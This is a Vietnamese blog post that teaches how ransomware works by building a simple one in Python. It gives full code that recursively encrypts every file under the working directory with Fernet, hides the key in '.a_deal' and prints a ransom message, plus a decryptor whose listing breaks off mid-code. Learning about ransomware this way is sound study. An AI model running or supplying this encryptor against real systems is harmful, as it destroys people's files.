<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Nam Nguyễn">
<meta name="description" content="Học về ransomware bằng cách làm 1 con ransomware" />
<meta name="keywords" content="homepage, blog, lập trình, hack, bảo mật" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://namberino.github.io/en/vietnamese/posts/harmless-ransomware/" />


    <title>
        
            Ransomware vô hại nhất trên thế giới :: Nam&#39;s Journal 
        
    </title>





<link rel="stylesheet" href="/main.f328c18cc29e8f38ea9856605ac2b3d52498b99bcd296a7867e57a6cd4ba1ec8.css" integrity="sha256-8yjBjMKejzjqmFZgWsKz1SSYuZvNKWp4Z&#43;V6bNS6Hsg=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="Ransomware vô hại nhất trên thế giới">
  <meta itemprop="description" content="Học về ransomware bằng cách làm 1 con ransomware">
  <meta itemprop="datePublished" content="2024-02-23T17:37:37+07:00">
  <meta itemprop="dateModified" content="2024-02-23T17:37:37+07:00">
  <meta itemprop="wordCount" content="1300">
  <meta itemprop="image" content="https://namberino.github.io/">
  <meta itemprop="keywords" content="Lập Trình,Hack,Bảo Mật">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://namberino.github.io/">
  <meta name="twitter:title" content="Ransomware vô hại nhất trên thế giới">
  <meta name="twitter:description" content="Học về ransomware bằng cách làm 1 con ransomware">



    <meta property="og:url" content="https://namberino.github.io/en/vietnamese/posts/harmless-ransomware/">
  <meta property="og:site_name" content="Nam&#39;s Journal">
  <meta property="og:title" content="Ransomware vô hại nhất trên thế giới">
  <meta property="og:description" content="Học về ransomware bằng cách làm 1 con ransomware">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="vietnamese">
    <meta property="article:published_time" content="2024-02-23T17:37:37+07:00">
    <meta property="article:modified_time" content="2024-02-23T17:37:37+07:00">
    <meta property="article:tag" content="Lập Trình">
    <meta property="article:tag" content="Hack">
    <meta property="article:tag" content="Bảo Mật">
    <meta property="og:image" content="https://namberino.github.io/">






    <meta property="article:published_time" content="2024-02-23 17:37:37 &#43;0700 &#43;07" />













<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
            delimiters: [
                {left: "$$", right: "$$", display: true},
                {left: "$", right: "$", display: false}
            ]
        });
    });
</script>


    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                nam$journal</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/en/about/">About</a></li><li><a href="/en/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
                <span class="theme-toggle not-selectable" style="margin-left: 1.5rem; margin-right: 1rem;">
	
        
            
            <a class="active language" style="text-decoration: underline;"> EN </a>
            
                <div style="margin-left: 0.12rem; margin-right: 0.12rem;"> | </div>
            
        
	
        
            
            
        
	

</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://namberino.github.io/en/vietnamese/posts/harmless-ransomware/">Ransomware vô hại nhất trên thế giới</a></h2>

            
            
            

            <div class="post-content">
                <blockquote>
<p><strong>Lưu ý</strong>: <strong>Không</strong> sử dụng phần mềm này cho việc xấu. Phần mềm này được làm cho mục đích học tập. Nếu bạn muốn chạy ransomware này thì chạy nó trong môi trường ảo, môi trường đã được cách ly. <strong>Đừng sử dụng nó cho việc xấu!</strong></p>
</blockquote>
<p>Kể từ khi mình bắt đầu xem phim <em>Mr. Robot</em>, mình thấy rất hứng thú với hacker và hack. Mình không phải là hacker nhưng mình rất thích học về các cách hack mà nhiều người khác nghĩ ra.</p>
<p>1 cách hack mà mình thấy rất thú vị là <em>ransomware</em>. Phần mềm này có khả năng mã hóa hết các file trên máy tính và tống tiền mình để giải mã các file đó. Với mình thì nó vừa đáng sợ, vừa thú vị.</p>
<p>Trong lúc mình học về ransomware, mình quyết định tự làm 1 con ransomware đơn giản và không có hại mấy để hiểu về ransomware hơn. Vậy nên trong bài đăng này chúng ta sẽ cùng học về ransomware bằng cách lập trình nó!</p>
<hr>
<h1 id="ý-tưởng-đằng-sau-ransomware">Ý tưởng đằng sau ransomware</h1>
<p>Ransomware sẽ mã hóa hết các file trên máy tính và chỉ giải mã các file đó khi mà hacker cho phép nó giải mã (điều này thường xảy ra sau khi nạn nhân bị hack đã trả tiền cho hacker).</p>
<p>Chúng ta sẽ cần 1 cách để tìm hết các file trên máy tính, mã hóa nó bằng 1 cái key (chìa khóa) giống như khóa bằng móc khóa ngoài đời thật, và giải mã nó bằng key mà mình dùng để mã hóa nó.</p>
<hr>
<h1 id="môi-trường-lập-trình">Môi trường lập trình</h1>
<p>Mình cần dùng <em>thư viện mã hóa</em> trong Python để mã hóa và giải mã các file mình tìm đc. Mình sử dụng thư viện có tên là <code>cryptography</code> và chúng ta có thể tải thư viện này bằng <code>pip</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install cryptography
</span></span></code></pre></div><hr>
<h1 id="cách-tìm-và-mã-hóa-file">Cách tìm và mã hóa file</h1>
<p>Thế làm thế nào để mình mã hóa hết các file trên máy? Đầu tiên thì mình phải tìm được hết các file trên máy tính. Mình sử dụng thư viện <code>os</code> của Python để tìm file. Mình cũng sẽ sử dụng thuật toán <em>Fernet</em> ở trong thư viện mã hóa mình vừa cài để mã hóa các file.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
</span></span></code></pre></div><p>Chúng ta lưu các file trên máy mà chúng ta tìm được trong 1 danh sách gọi là <code>files</code>.</p>
<p>Chúng ta cần check xem cái &ldquo;file&rdquo; đó là 1 file bình thường hay là 1 folder. Chúng ta có thể dùng hàm <code>os.path.isfile()</code> để check. Nếu như &ldquo;file&rdquo; đó không phải là file mà là folder thì chúng ta cần đi vào trong folder đó và check các file trong folder đó. Nếu folder đó có folder thì sẽ tiếp tục vào folder trong folder đó.</p>
<p>Sau khi chúng ta tìm đường dẫn của các file, chúng ta sẽ lưu đường dẫn tới các file đó trong danh sách <code>files</code>.</p>
<p>Chúng ta cũng cần tránh không lưu chương trình mã hóa, giải mã và key của mình trong lúc tìm kiếm file bởi vì nếu như chúng ta mã hóa file giải mã và file key thì sau này sẽ không giải mã các file được.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># bill-cipher.py</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span></code></pre></div><p>Tiếp theo, chúng ta cần tạo key để mã hóa các file chương trình của mình đã tìm được. Key này sẽ được lưu trong <code>.a_deal</code> (mình lưu trong file thế này bởi vì các file có chấm ở đầu tên file sẽ được ẩn trên các hệ thống Unix).</p>
<p>Sau khi chúng ta tạo key thì chúng ta sẽ cần mở các file bằng đường dẫn mình lưu trong <code>files</code>, đọc file và mã hóa nội dung mình đọc được từ file, rồi viết nội dung đã mã hóa vào lại file. Mình đọc và viết ở chế độ nhị phân bởi vì thuật toán Fernet được dùng cho nhị phân.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
</span></span></code></pre></div><p>Thế là xong chương trình mã hóa file (<code>bill-cipher.py</code>). Đây là code cho chương trình mã hóa này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;File đã bị mã hóa! Trả tiền thì sẽ giải mã&#34;</span>)
</span></span></code></pre></div><p>Nếu như mình chạy file <code>bill-cipher.py</code> thì có thể thấy là các file mà chương trình này tìm được sẽ bị mã hóa và trở thành file chứa 1 đống chữ cái, ký tự random.</p>
<p><img alt="file1-encrypted" src="/img/harmless-ransomware/file1-encrypted.png"></p>
<p>Chương trình này cũng có thể mã hóa file ảnh và video nữa.</p>
<p><img alt="pic-encrypted" src="/img/harmless-ransomware/pic-encrypted.png"></p>
<p>Chúng ta biết cách tìm và mã hóa các file trên máy rồi, bây giờ chúng ta cần cách giải mã các file đó.</p>
<hr>
<h1 id="cách-giải-mã">Cách giải mã</h1>
<p>Để giải mã các file bị mã hóa, chúng ta sẽ cần tìm các file đó trước. Thế nên chúng ta sẽ dùng đoạn code tìm file của chương trình mã hóa trên.</p>
<p>Sau khi tìm được file, chúng ta cần đọc key trong <code>.a_deal</code> để giải mã các file bị mã hóa bằng key này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span></code></pre></div><p>Chúng ta sẽ đọc nội dung file ở chế độ nhị phân, giải mã bằng key trong <code>.a_deal</code> và viết nội dung đã giải mã vào lại file đó.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
</span></span></code></pre></div><p>Thế là xong chương trình giải mã file (<code>bill-cipher.py</code>). Đây là code cho chương trình giải mã này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
